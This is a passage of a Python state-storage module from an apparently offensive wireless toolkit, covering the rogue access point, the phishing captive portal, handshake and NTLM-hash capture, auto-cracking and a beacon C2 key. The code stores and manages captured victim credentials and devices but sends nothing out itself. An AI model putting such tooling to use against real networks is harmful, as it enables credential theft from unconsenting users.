"""Filesystem-backed state shared across threads (engine, portal, dashboard).

Handles the JSON state file the UI writes to, the JSON-lines event stream that
feeds the SSE log, credential capture/rotation to the loot dir, whitelist, and
the token/session files used for dashboard auth.
"""

import json
import os
import re
import threading
import time
import shutil

from . import config

_lock = threading.RLock()
_emit_count = 0
_mirror_last = 0.0
_cred_since_trim = 0

MAX_EVENTS = int(os.environ.get('MALSTROM_MAX_EVENTS', '2000'))
TRIM_EVENTS = MAX_EVENTS + 500
# Human-readable cred block in creds.log (10 label lines + `[ts]` + dashes +
# blank line). Used to keep the log bounded with the JSONL store.
CRED_LOG_LINES = 12
TRIM_CREDS = config.MAX_CREDS + 250

STATE_FILE = os.path.join(config.STATE_DIR, 'state')
EVENTS_FILE = os.path.join(config.STATE_DIR, 'events')
CREDS_FILE = os.path.join(config.STATE_DIR, 'creds.json')
CREDS_LOG = os.path.join(config.STATE_DIR, 'creds.log')
DEVICES_FILE = os.path.join(config.STATE_DIR, 'devices.json')
PROBES_FILE = os.path.join(config.STATE_DIR, 'probes.json')
HANDSHAKES_FILE = os.path.join(config.STATE_DIR, 'handshakes.json')
WHITELIST_FILE = os.path.join(config.STATE_DIR, 'whitelist.txt')
TOKEN_FILE = os.path.join(config.STATE_DIR, 'token')
NONCE_FILE = os.path.join(config.STATE_DIR, 'nonce')
SESSION_FILE = os.path.join(config.STATE_DIR, 'session')
SESSION_CAP = 16
CURRENT_SSID_FILE = os.path.join(config.STATE_DIR, 'current_ssid')
TEMPLATE_DEFAULT_FILE = os.path.join(config.STATE_DIR, 'template_default')
PORTAL_PID_FILE = os.path.join(config.STATE_DIR, 'portal.pid')
DASH_PID_FILE = os.path.join(config.STATE_DIR, 'dash.pid')
DASH_PORT_FILE = os.path.join(config.STATE_DIR, 'dash.port')
HOSTAPD_CONF = os.path.join(config.STATE_DIR, 'hostapd.conf')
HOSTAPD_PID = os.path.join(config.STATE_DIR, 'hostapd.pid')
HOSTAPD_LOG = os.path.join(config.STATE_DIR, 'hostapd.log')
DNSMASQ_PID = os.path.join(config.STATE_DIR, 'dnsmasq.pid')

SCANS_FILE = os.path.join(config.STATE_DIR, 'scans.json')
OWNED_FILE = os.path.join(config.STATE_DIR, 'owned.json')
HASHES_FILE = os.path.join(config.STATE_DIR, 'hashes.json')
CRACKED_FILE = os.path.join(config.STATE_DIR, 'cracked.json')
HASHES_TXT = os.path.join(config.STATE_DIR, 'hashes.txt')
BEACONS_FILE = os.path.join(config.STATE_DIR, 'beacons.json')
BEACON_KEY_FILE = os.path.join(config.STATE_DIR, 'beacon.key')
MITM_LOG = os.path.join(config.STATE_DIR, 'mitm.log')
WEB_LOG = os.path.join(config.STATE_DIR, 'web.log')
SETTINGS_FILE = os.path.join(config.STATE_DIR, 'settings.json')
PINNED_FILE = os.path.join(config.STATE_DIR, 'pinned.json')
BEACON_PAYLOAD_DIR = os.path.join(config.STATE_DIR, 'beacon')
APP_MODE_FILE = os.path.join(config.STATE_DIR, '.app-mode')
NFT_RULES = os.path.join(config.STATE_DIR, 'nft.rules')
AUDIT_LOG = os.path.join(config.STATE_DIR, 'audit.log')
VAULT_KEY_FILE = os.path.join(config.STATE_DIR, '.vault.key')
# Per-engagement integrity snapshots. Kept in the STATE dir (not the loot
# mirror) so they survive `clear-loot` — wiping the vault is the operator's
# explicit act, but the audit trail of what was there lives on.
ENGAGEMENTS_DIR = os.path.join(config.STATE_DIR, 'engagements')
ENGAGEMENTS_INDEX = os.path.join(ENGAGEMENTS_DIR, 'index.json')

# Operator-facing files that must never land world-readable: dashboard token,
# challenge nonce, live vote-session store, captured credentials (primary +
# human-readable mirror), the beacon C2 key, the settings blob (may embed the
# wpa psk), and the runtime state file.

_alert_hooks = []


def ensure():
    for d in (config.STATE_DIR, config.LOOT_DIR, ENGAGEMENTS_DIR):
        try:
            os.makedirs(d, exist_ok=True)
        except OSError:
            pass


def harden_state():
    """Lock down sensitive on-disk files to owner-only. Safe to call any time;
    freshly written objects are re-tightened on every daemon start."""
    for path in (TOKEN_FILE, NONCE_FILE, SESSION_FILE, CREDS_FILE, CREDS_LOG,
                 BEACON_KEY_FILE, SETTINGS_FILE, STATE_FILE, AUDIT_LOG,
                 VAULT_KEY_FILE, WEB_LOG, EVENTS_FILE):
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass


def add_alert_hook(cb):
    """Register a callback fired on every ALERT-class event (out-of-band
    notification). The callback receives (etype, msg) and must return fast /
    not raise. Independent of the SSE log; used by malstrom.notify."""
    if callable(cb):
        _alert_hooks.append(cb)


def audit(action, detail='', addr=''):
    """Append one operator-action record to the append-only audit log.

    The dashboard dispatch calls this for every state-mutating API action
    (who did what, from where, when). Entries are immutable — the file is
    never trimmed or rewritten.
    """
    try:
        os.makedirs(config.STATE_DIR, exist_ok=True)
    except OSError:
        pass
    entry = {
        'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
        'action': str(action)[:64],
        'detail': (detail or '')[:768],
        'addr': str(addr)[:64],
    }
    with _lock:
        try:
            with open(AUDIT_LOG, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
            try:
                os.chmod(AUDIT_LOG, 0o600)
            except OSError:
                pass
        except IOError:
            pass
    return entry


def app_mode_enabled():
    """True when the daemon was launched from the desktop launcher.

    The launcher drops a .app-mode flag before starting the service. In this
    mode the daemon starts disarm/clean and shuts itself down once the
    dashboard is closed. A pure `malstrom start` (daemon mode) never sets it.
    """
    if config.APP_MODE:
        return True
    try:
        return os.path.isfile(APP_MODE_FILE)
    except OSError:
        return False


def set_app_mode(on):
    try:
        if on:
            with open(APP_MODE_FILE, 'w') as fh:
                fh.write('1\n')
        else:
            os.remove(APP_MODE_FILE)
    except OSError:
        pass


def load_state():
    try:
        with open(STATE_FILE) as fh:
            data = json.load(fh)
        merged = dict(config.DEFAULT_STATE)
        merged.update(data)
        return merged
    except (IOError, ValueError):
        return dict(config.DEFAULT_STATE)


def write_state(state):
    with _lock:
        with open(STATE_FILE, 'w') as fh:
            json.dump(state, fh)


def emit(etype, msg):
    global _emit_count
    line = json.dumps({
        'ts': time.strftime('%Y-%m-%d %H:%M:%S'),
        'type': etype,
        'msg': msg,
    })
    with _lock:
        try:
            with open(EVENTS_FILE, 'a') as fh:
                fh.write(line + '\n')
        except IOError:
            pass
        _emit_count += 1
        if _emit_count >= 100:
            _emit_count = 0
            _trim_events()
    if etype == 'ALERT':
        for cb in list(_alert_hooks):
            try:
                cb(etype, msg)
            except Exception:
                pass


def _trim_events():
    """Keep the events file bounded to avoid unbounded memory growth."""
    try:
        with open(EVENTS_FILE, 'r') as fh:
            lines = fh.readlines()
        if len(lines) > TRIM_EVENTS:
            lines = lines[-MAX_EVENTS:]
            with open(EVENTS_FILE, 'w') as fh:
                fh.writelines(lines)
    except IOError:
        pass


def count_creds():
    try:
        with open(CREDS_FILE) as fh:
            return sum(1 for _ in fh)
    except IOError:
        return 0


def read_creds():
    out = []
    try:
        with open(CREDS_FILE) as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except ValueError:
                    out.append({'ts': '?', 'username': '?', 'password': line})
    except IOError:
        pass
    return out


def _cred_log_text(entry):
    return ("[%s]\n"
            "  Template:   %s\n"
            "  Device:     %s\n"
            "  Username:   %s\n"
            "  Password:   %s\n"
            "  Hostname:   %s\n"
            "  MAC:        %s\n"
            "  IP:         %s\n"
            "  UserAgent:  %s\n"
            "%s\n\n" % (entry.get('ts', '?'), entry.get('template', ''),
                        entry.get('device', ''), entry.get('username', ''),
                        entry.get('password', ''), entry.get('hostname', ''),
                        entry.get('mac', ''), entry.get('ip', ''),
                        entry.get('ua', ''), '-' * 46))


def append_cred(entry):
    global _cred_since_trim
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        try:
            with open(CREDS_FILE, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
        except IOError:
            pass
        text = _cred_log_text(entry)
        try:
            with open(CREDS_LOG, 'a') as fh:
                fh.write(text)
        except IOError:
            pass
        _cred_since_trim += 1
        if _cred_since_trim >= 100:
            _cred_since_trim = 0
            _trim_creds()


def _trim_creds():
    """Keep the creds stores bounded to the newest MAX_CREDS entries so a
    repeat portal victim can't grow state on disk forever."""
    try:
        with open(CREDS_FILE, 'r') as fh:
            lines = fh.readlines()
        if len(lines) > TRIM_CREDS:
            lines = lines[-config.MAX_CREDS:]
            with open(CREDS_FILE, 'w') as fh:
                fh.writelines(lines)
    except IOError:
        pass
    try:
        with open(CREDS_LOG, 'r') as fh:
            log_lines = fh.readlines()
        if len(log_lines) > TRIM_CREDS * CRED_LOG_LINES:
            with open(CREDS_LOG, 'w') as fh:
                fh.writelines(log_lines[-config.MAX_CREDS * CRED_LOG_LINES:])
    except IOError:
        pass


def _vault_name(name):
    """basename the mirrored copy should have when the at-rest vault is on:
    sensitive loot files are stored Fernet-encrypted, everything else plain."""
    if (config.VAULT and name in ('creds.json', 'creds.log')
            and _vault_available()):
        return name + '.vault'
    return name


def mirror_loot():
    global _mirror_last
    now = time.time()
    if now - _mirror_last < 3:
        return
    _mirror_last = now
    for name in ('creds.json', 'creds.log', 'devices.json',
                 'handshakes.json', 'probes.json',
                 'hashes.json', 'hashes.txt', 'cracked.json', 'scans.json',
                 'owned.json', 'beacons.json', 'mitm.log'):
        src = os.path.join(config.STATE_DIR, name)
        if not os.path.exists(src):
            continue
        dst = os.path.join(config.LOOT_DIR, _vault_name(name))
        try:
            with open(src, 'rb') as fh:
                data = fh.read()
            if dst.endswith('.vault') and config.VAULT and _vault_available():
                from . import vault
                data = vault.encrypt(data)
            with open(dst, 'wb') as fh:
                fh.write(data)
        except IOError:
            pass


def _vault_available():
    """True when the at-rest vault can actually encrypt (cryptography present).
    Never falls back to "faux crypto" — no cryptography ⇒ plaintext mirror."""
    try:
        from . import vault
        return vault.available()
    except Exception:
        return False


V_ARCHIVE_STORES = ('events', 'creds.json', 'creds.log', 'devices.json',
                    'handshakes.json', 'probes.json', 'hashes.json',
                    'hashes.txt', 'cracked.json', 'scans.json', 'owned.json',
                    'beacons.json', 'mitm.log', 'audit.log', 'web.log')


def _sha256_file(path):
    import hashlib
    h = hashlib.sha256()
    try:
        with open(path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(65536), b''):
                h.update(chunk)
        return h.hexdigest()
    except OSError:
        return None


def archive_engagement():
    """Snapshot every data store into a per-engagement integrity archive.

    Writes STATE_DIR/engagements/<ts>-<rand>/ with a .sha256 sidecar per file
    and appends to index.json mapping engagement id -> {ts, files, hashes}.
    Teardown (disarm/reset/cleanup) calls this BEFORE touching the stores, so
    the evidence of what an engagement collected survives the wipe. Returns
    the engagement id ('' if nothing worth archiving).
    """
    ts = time.strftime('%Y%m%dT%H%M%S')
    if not any(os.path.exists(os.path.join(config.STATE_DIR, n))
               for n in V_ARCHIVE_STORES):
        return ''
    eid = '%s-%s' % (ts, os.urandom(2).hex())
    dst = os.path.join(ENGAGEMENTS_DIR, eid)
    files = {}
    try:
        os.makedirs(dst)
    except OSError:
        return ''
    for name in V_ARCHIVE_STORES:
        src = os.path.join(config.STATE_DIR, name)
        if not os.path.exists(src):
            continue
        dig = _sha256_file(src)
        if dig is None:
            continue
        try:
            shutil.copy2(src, os.path.join(dst, name))
            with open(os.path.join(dst, name + '.sha256'), 'w') as fh:
                fh.write(dig + '\n')
            files[name] = dig
        except IOError:
            continue
    record = {
        'id': eid,
        'ts': ts,
        'note': '',
        'files': files,
        'count': sum(1 for f in files if f in ('creds.json', 'devices.json',
                                               'events')),
    }
    with _lock:
        try:
            index = _jload(ENGAGEMENTS_INDEX, {})
            index.setdefault('engagements', []).append(record)
            _jsave(ENGAGEMENTS_INDEX, index)
        except OSError:
            pass
    return eid


def clear_loot():
    """Wipe the mirrored loot tree on disk (files + pcaps). Keeps the dir."""
    with _lock:
        try:
            for name in os.listdir(config.LOOT_DIR):
                p = os.path.join(config.LOOT_DIR, name)
                if os.path.isdir(p) and not os.path.islink(p):
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    try:
                        os.remove(p)
                    except OSError:
                        pass
        except OSError:
            pass
        try:
            os.makedirs(config.PCAP_DIR, exist_ok=True)
        except OSError:
            pass


def reset_stores(preserve_pinned=True):
    """Wipe the primary on-device data stores kept in the state dir.

    When `preserve_pinned` is set (default), pinned credentials and devices
    survive; everything else is wiped. Set it False for a full wipe.
    """
    pinned = read_pinned() if preserve_pinned else {'creds': [], 'devices': []}
    pinned_creds = set(pinned.get('creds') or [])
    pinned_devs = set(pinned.get('devices') or [])
    with _lock:
        if pinned_creds:
            kept = []
            try:
                with open(CREDS_FILE) as fh:
                    for line in fh:
                        line = line.rstrip('\n')
                        if not line.strip():
                            continue
                        try:
                            entry = json.loads(line)
                        except ValueError:
                            entry = None
                        if entry is not None and cred_key(entry) in pinned_creds:
                            kept.append(line)
            except IOError:
                pass
            try:
                if kept:
                    with open(CREDS_FILE, 'w') as fh:
                        fh.write('\n'.join(kept) + '\n')
                else:
                    os.remove(CREDS_FILE)
            except OSError:
                pass
            try:
                if kept:
                    entries = [json.loads(l) for l in kept]
                    with open(CREDS_LOG, 'w') as fh:
                        fh.write(''.join(_cred_log_text(e) for e in entries))
                else:
                    os.remove(CREDS_LOG)
            except (OSError, ValueError):
                pass
        else:
            for path in (CREDS_FILE, CREDS_LOG):
                try:
                    os.remove(path)
                except OSError:
                    pass
        if pinned_devs:
            devs = read_devices()
            kept = {mac: d for mac, d in devs.items()
                    if str(mac).upper() in pinned_devs}
            try:
                if kept:
                    with open(DEVICES_FILE, 'w') as fh:
                        json.dump(kept, fh, indent=1)
                else:
                    os.remove(DEVICES_FILE)
            except OSError:
                pass
        else:
            try:
                os.remove(DEVICES_FILE)
            except OSError:
                pass
        for path in (PROBES_FILE, HANDSHAKES_FILE, SCANS_FILE, OWNED_FILE,
                     HASHES_FILE, HASHES_TXT, CRACKED_FILE, BEACONS_FILE,
                     MITM_LOG):
            try:
                os.remove(path)
            except OSError:
                pass


def reset_all(preserve_auth=True):
    """Factory reset.

    Wipes the loot tree, the data stores, target state, whitelist, sessions,
    custom templates, settings and the event log, and rotates the beacon key.
    The active kill chain must be torn down by the caller first.

    `preserve_auth` (default True) keeps the dashboard password and the current
    session so the operator stays signed in. Set it False for a full wipe
    (fresh-install state — the daemon regenerates a password on next start).
    """
    with _lock:
        clear_loot()
        reset_stores(preserve_pinned=False)
        for path in (STATE_FILE, WHITELIST_FILE, NONCE_FILE,
                     CURRENT_SSID_FILE, TEMPLATE_DEFAULT_FILE,
                     SETTINGS_FILE, EVENTS_FILE, PINNED_FILE):
            try:
                os.remove(path)
            except OSError:
                pass
        if not preserve_auth:
            for path in (TOKEN_FILE, SESSION_FILE):
                try:
                    os.remove(path)
                except OSError:
                    pass
        try:
            shutil.rmtree(config.CUSTOM_TEMPLATES_DIR, ignore_errors=True)
        except OSError:
            pass
        rotate_beacon_key()


def clear_stock():
    """Reset to stock.

    Clears all operational data (loot tree, scans, unpinned creds/devices,
    handshakes, probes, hashes, beacons, events, target config) while
    preserving the operator's portal assets: custom templates, template
    selection, whitelist, settings, dashboard auth and the beacon key, plus
    any user-pinned credentials and devices.

    The active kill chain must be torn down by the caller first.
    """
    with _lock:
        clear_loot()
        reset_stores()
        for path in (STATE_FILE, NONCE_FILE,
                     CURRENT_SSID_FILE, EVENTS_FILE,
                     config.DHCP_LEASE_FILE):
            try:
                os.remove(path)
            except OSError:
                pass


def cred_key(entry):
    """Composite identifier for a credential entry (stable across lines)."""
    return '|'.join([str(entry.get('ts', '')),
                     str(entry.get('username', '')),
                     str(entry.get('mac', ''))])


def read_pinned():
    try:
        with open(PINNED_FILE) as fh:
            data = json.load(fh)
        if not isinstance(data, dict):
            return {'creds': [], 'devices': []}
        return {
            'creds': list(data.get('creds', []) or []),
            'devices': list(data.get('devices', []) or []),
        }
    except (IOError, ValueError):
        return {'creds': [], 'devices': []}


def _write_pinned(data):
    with _lock:
        try:
            with open(PINNED_FILE, 'w') as fh:
                json.dump(data, fh)
        except IOError:
            pass


def toggle_pinned_cred(key):
    """Pin/unpin a credential by its composite key. Returns the new state."""
    key = key or ''
    if not key:
        return read_pinned()
    data = read_pinned()
    creds = data['creds']
    if key in creds:
        creds = [c for c in creds if c != key]
    else:
        creds = (creds + [key])[-200:]
    data['creds'] = creds
    _write_pinned(data)
    return data


def toggle_pinned_device(mac):
    """Pin/unpin a device by MAC. Returns the new state."""
    mac = (mac or '').upper()
    if not mac:
        return read_pinned()
    data = read_pinned()
    devices = data['devices']
    if mac in devices:
        devices = [m for m in devices if m != mac]
    else:
        devices = (devices + [mac])[-200:]
    data['devices'] = devices
    _write_pinned(data)
    return data


def read_devices():
    try:
        with open(DEVICES_FILE) as fh:
            data = json.load(fh)
        return data if isinstance(data, dict) else {}
    except (IOError, ValueError):
        return {}


def upsert_device(mac, ip='', hostname='', os_='', ua='', cred=False):
    """Merge a device fingerprint keyed by MAC (bounded)."""
    mac = (mac or '').upper()
    if not mac:
        return
    now = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        devs = read_devices()
        dev = devs.get(mac, {'mac': mac})
        dev['first_seen'] = dev.get('first_seen', now)
        dev['last_seen'] = now
        if hostname:
            dev['hostname'] = hostname
        if os_:
            dev['os'] = os_
        if ua:
            dev['ua'] = ua[:300]
        if ip:
            dev['ips'] = list(dict.fromkeys(dev.get('ips', []) + [ip]))[-8:]
        if cred:
            dev['creds'] = int(dev.get('creds', 0)) + 1
        devs[mac] = dev
        if len(devs) > config.MAX_DEVICES:
            ordered = sorted(devs.values(),
                             key=lambda d: d.get('last_seen', ''), reverse=True)
            devs = {d['mac']: d for d in ordered[:config.MAX_DEVICES]}
        try:
            with open(DEVICES_FILE, 'w') as fh:
                json.dump(devs, fh, indent=1)
        except IOError:
            pass


def append_probe(mac, ssid):
    """Log a client probe-request SSID (karma / device interest)."""
    mac = (mac or '').upper()
    if not mac or not ssid:
        return
    with _lock:
        probes = []
        try:
            with open(PROBES_FILE) as fh:
                probes = json.load(fh)
            if not isinstance(probes, list):
                probes = []
        except (IOError, ValueError):
            probes = []
        probes.append({'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
                       'mac': mac, 'ssid': ssid})
        probes = probes[-config.MAX_PROBES:]
        try:
            with open(PROBES_FILE, 'w') as fh:
                json.dump(probes, fh, indent=1)
        except IOError:
            pass


def read_probes():
    try:
        with open(PROBES_FILE) as fh:
            data = json.load(fh)
        return data if isinstance(data, list) else []
    except (IOError, ValueError):
        return []


def index_handshake(entry):
    """Index a captured handshake/PMKID sighting (append-only)."""
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        try:
            with open(HANDSHAKES_FILE, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
        except IOError:
            pass


def update_handshakes(match, fields):
    """Patch handshake/PMKID sightings in place by predicate.

    `match` receives a parsed sighting entry and returns truthy when it should
    be updated. Returns the number of entries patched.
    """
    with _lock:
        try:
            with open(HANDSHAKES_FILE) as fh:
                raw = [line.rstrip('\n') for line in fh]
        except IOError:
            return 0
        out = []
        hit = 0
        for line in raw:
            if not line.strip():
                out.append(line)
                continue
            try:
                entry = json.loads(line)
            except ValueError:
                out.append(line)
                continue
            if match(entry):
                entry.update(fields)
                hit += 1
            out.append(json.dumps(entry))
        try:
            with open(HANDSHAKES_FILE, 'w') as fh:
                fh.write('\n'.join(out))
                if out:
                    fh.write('\n')
        except IOError:
            return 0
        if hit:
            mirror_loot()
        return hit


def read_handshakes():
    out = []
    try:
        with open(HANDSHAKES_FILE) as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except ValueError:
                    pass
    except IOError:
        pass
    return out[-200:]


def custom_templates():
    names = []
    try:
        for f in sorted(os.listdir(config.CUSTOM_TEMPLATES_DIR)):
            if f.endswith('.html'):
                names.append(f[:-5])
    except OSError:
        pass
    return names


def save_custom_template(name, body):
    if not name or not body:
        return False
    safe = re.sub(r'[^A-Za-z0-9_-]', '_', name).strip('_')[:48]
    if not safe:
        return False
    try:
        os.makedirs(config.CUSTOM_TEMPLATES_DIR, exist_ok=True)
        with open(os.path.join(config.CUSTOM_TEMPLATES_DIR, safe + '.html'),
                  'w', encoding='utf-8') as fh:
            fh.write(body)
        return True
    except OSError:
        return False


def read_whitelist():
    try:
        with open(WHITELIST_FILE) as fh:
            return [l.strip() for l in fh if l.strip()]
    except IOError:
        return []


def is_mac(v):
    v = (v or '').strip()
    parts = v.split(':')
    if len(parts) != 6:
        return False
    try:
        return all(len(p) == 2 and int(p, 16) >= 0 for p in parts)
    except ValueError:
        return False


def is_ip(v):
    v = (v or '').strip()
    parts = v.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def read_shield_macs():
    return {m.upper() for m in read_whitelist() if is_mac(m)}


def add_whitelist(ip):
    if not ip:
        return
    current = set(read_whitelist())
    if ip in current:
        return
    with _lock:
        try:
            with open(WHITELIST_FILE, 'a') as fh:
                fh.write(ip + '\n')
        except IOError:
            pass


def remove_whitelist(entry):
    entry = (entry or '').strip()
    if not entry:
        return False
    current = read_whitelist()
    if entry not in current:
        return False
    with _lock:
        try:
            with open(WHITELIST_FILE, 'w') as fh:
                fh.write('\n'.join(c for c in current if c != entry) + '\n')
            return True
        except IOError:
            return False


def clear_whitelist():
    """Un-shield every client so the portal is served to them again."""
    with _lock:
        try:
            with open(WHITELIST_FILE, 'w'):
                pass
            return True
        except IOError:
            return False


def clear_whitelist_ips():
    """Drop captured-client IP shields only; keep operator-set MAC shields.

    Captured victims are shielded by IP, and the rogue subnet is the same
    (172.16.52.0/24) on every engagement — a returning device that reuses one
    of those IPs would otherwise be DNAT-bypassed and NEVER see the portal.
    A fresh engagement should serve the portal to everyone again.
    """
    current = read_whitelist()
    kept = [e for e in current if is_mac(e)]
    if len(kept) == len(current):
        return 0
    with _lock:
        try:
            with open(WHITELIST_FILE, 'w') as fh:
                if kept:
                    fh.write('\n'.join(kept) + '\n')
        except IOError:
            return 0
    return len(current) - len(kept)


def get_token():
    try:
        with open(TOKEN_FILE) as fh:
            return fh.read().strip() or None
    except IOError:
        return None


def set_token(t):
    try:
        os.makedirs(config.STATE_DIR, exist_ok=True)
    except OSError:
        pass
    with open(TOKEN_FILE, 'w') as fh:
        fh.write(str(t) + '\n')
    try:
        os.chmod(TOKEN_FILE, 0o600)
    except OSError:
        pass
    return True


def set_nonce(n):
    with _lock:
        with open(NONCE_FILE, 'w') as fh:
            fh.write(str(n) + '\n')


def get_nonce():
    try:
        with open(NONCE_FILE) as fh:
            return fh.read().strip() or ''
    except IOError:
        return ''


def set_session(s):
    with _lock:
        sids = get_sessions()
        if s not in sids:
            sids.append(s)
        with open(SESSION_FILE, 'w') as fh:
            fh.writelines('%s\n' % sid for sid in sids[-SESSION_CAP:])


def clear_sessions():
    """Invalidate every existing session (e.g. gate just turned on)."""
    with _lock:
        try:
            with open(SESSION_FILE, 'w'):
                pass
        except IOError:
            pass


def get_sessions():
    try:
        with open(SESSION_FILE) as fh:
            return [ln.strip() for ln in fh if ln.strip()]
    except IOError:
        return []


def session_valid(s):
    return bool(s) and s in get_sessions()


def get_session():
    sids = get_sessions()
    return sids[-1] if sids else ''


def get_current_ssid():
    try:
        with open(CURRENT_SSID_FILE) as fh:
            return fh.read().strip() or ''
    except IOError:
        return ''


def set_current_ssid(ssid):
    with _lock:
        try:
            with open(CURRENT_SSID_FILE, 'w') as fh:
                fh.write(ssid + '\n')
        except IOError:
            pass


def get_portal_ssid():
    return (load_state().get('portal_ssid') or '').strip()


def state_has(key):
    """True if `key` is explicitly present in the persisted state file
    (not merely injected from DEFAULT_STATE)."""
    try:
        with open(STATE_FILE) as fh:
            data = json.load(fh)
        return isinstance(data, dict) and key in data
    except (IOError, ValueError):
        return False


def set_portal_ssid(ssid):
    ssid = (ssid or '').strip()
    st = load_state()
    st['portal_ssid'] = ssid
    st['updated'] = int(time.time())
    write_state(st)


def get_template_default():
    try:
        with open(TEMPLATE_DEFAULT_FILE) as fh:
            return fh.read().strip() or config.DEFAULT_TEMPLATE
    except IOError:
        return config.DEFAULT_TEMPLATE


def set_template_default(t):
    with _lock:
        try:
            with open(TEMPLATE_DEFAULT_FILE, 'w') as fh:
                fh.write(t + '\n')
        except IOError:
            pass


# --- post-exploitation stores --------------------------------------------------

def _jload(path, default):
    try:
        with open(path) as fh:
            data = json.load(fh)
        return data if data is not None else default
    except (IOError, ValueError):
        return default


def _jsave(path, data):
    with _lock:
        try:
            with open(path, 'w') as fh:
                json.dump(data, fh, indent=1)
        except IOError:
            pass


def list_scans():
    scans = _jload(SCANS_FILE, [])
    return scans if isinstance(scans, list) else []


def put_scan(entry):
    scans = [s for s in list_scans() if s.get('id') != entry.get('id')]
    scans.append(entry)
    _jsave(SCANS_FILE, scans[-40:])


def read_owned():
    owned = _jload(OWNED_FILE, [])
    return owned if isinstance(owned, list) else []


def append_owned(entry):
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    owned = read_owned()
    owned.append(entry)
    _jsave(OWNED_FILE, owned[-300:])


def read_hashes():
    out = []
    try:
        with open(HASHES_FILE) as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except ValueError:
                    pass
    except IOError:
        pass
    return out[-300:]


def append_hash(entry):
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        try:
            with open(HASHES_FILE, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
        except IOError:
            pass
        token = entry.get('token', '')
        if token:
            try:
                with open(HASHES_TXT, 'a') as fh:
                    fh.write(token.rstrip() + '\n')
            except IOError:
                pass


def append_web(entry):
    """Metadata-only record of one relayed victim HTTP exchange (no content)."""
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        try:
            with open(WEB_LOG, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
        except IOError:
            pass


def update_hashes(match, fields):
    """Patch hash entries in place by predicate (mirrors update_handshakes).

    Used by the auto-crack pipeline to stamp recovered plaintexts onto the
    original NetNTLMv2 sightings. Returns the number patched.
    """
    with _lock:
        try:
            with open(HASHES_FILE) as fh:
                raw = [line.rstrip('\n') for line in fh]
        except IOError:
            return 0
        out = []
        hit = 0
        for line in raw:
            if not line.strip():
                out.append(line)
                continue
            try:
                entry = json.loads(line)
            except ValueError:
                out.append(line)
                continue
            if match(entry):
                entry.update(fields)
                hit += 1
            out.append(json.dumps(entry))
        try:
            with open(HASHES_FILE, 'w') as fh:
                fh.write('\n'.join(out))
                if out:
                    fh.write('\n')
        except IOError:
            return 0
        if hit:
            mirror_loot()
        return hit


def read_cracked():
    """Recovered plaintexts (portal PSKs etc.) from the auto-crack pipeline."""
    out = []
    try:
        with open(CRACKED_FILE) as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    out.append(json.loads(line))
                except ValueError:
                    pass
    except IOError:
        pass
    return out[-300:]


def append_cracked(entry):
    if not entry.get('ts'):
        entry['ts'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
    with _lock:
        try:
            with open(CRACKED_FILE, 'a') as fh:
                fh.write(json.dumps(entry) + '\n')
        except IOError:
            pass
        mirror_loot()


_WORDLIST_CANDIDATES = (
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/fasttrack.txt',
    '/usr/share/wordlists/wifite.txt',
    '/usr/share/wordlists/nmap.lst',
    '/usr/share/wordlists/john.lst',
)


def crack_wordlist():
    """Resolve the wordlist the auto-crack engines use ('' = none found).

    Precedence: dashboard setting > MALSTROM_CRACK_WORDLIST > first common
    wordlist present on the box > a one-time gunzip of rockyou.txt.gz into
    the state dir (Kali ships only the archive). An explicitly configured
    wordlist that is missing returns '' — never a silent fallback to some
    other list the operator did not choose.
    """
    try:
        wl = (read_settings().get('crack_wordlist') or '').strip()
    except Exception:
        wl = ''
    wl = wl or (config.CRACK_WORDLIST or '').strip()
    if wl:
        return wl if os.path.isfile(wl) else ''
    for cand in _WORDLIST_CANDIDATES:
        if os.path.isfile(cand):
            return cand
    gz = '/usr/share/wordlists/rockyou.txt.gz'
    out = os.path.join(config.STATE_DIR, 'rockyou.txt')
    if not os.path.isfile(gz):
        return ''
    if os.path.isfile(out):
        return out
    import gzip
    part = out + '.part'
    try:
        with gzip.open(gz, 'rb') as src, open(part, 'wb') as dst:
            while True:
                chunk = src.read(1024 * 1024)
                if not chunk:
                    break
                dst.write(chunk)
        os.replace(part, out)          # partial extract must never read back
    except OSError:
        try:
            os.remove(part)
        except OSError:
            pass
        return ''
    return out


def read_beacons():
    b = _jload(BEACONS_FILE, {})
    return b if isinstance(b, dict) else {}


def write_beacons(sessions):
    if not isinstance(sessions, dict):
        return
    if len(sessions) > 50:
        order = sorted(sessions.values(),
                       key=lambda s: s.get('last_seen', ''), reverse=True)
        sessions = {s['id']: s for s in order[:50]}
    _jsave(BEACONS_FILE, sessions)


def get_beacon_key():
    key = ''
    try:
        with open(BEACON_KEY_FILE) as fh:
            key = fh.read().strip()
    except IOError:
        pass
    if not key:
        key = os.urandom(6).hex()
        try:
            os.makedirs(config.STATE_DIR, exist_ok=True)
        except OSError:
            pass
        with _lock:
            try:
                with open(BEACON_KEY_FILE, 'w') as fh:
                    fh.write(key + '\n')
                try:
                    os.chmod(BEACON_KEY_FILE, 0o600)
                except OSError:
                    pass
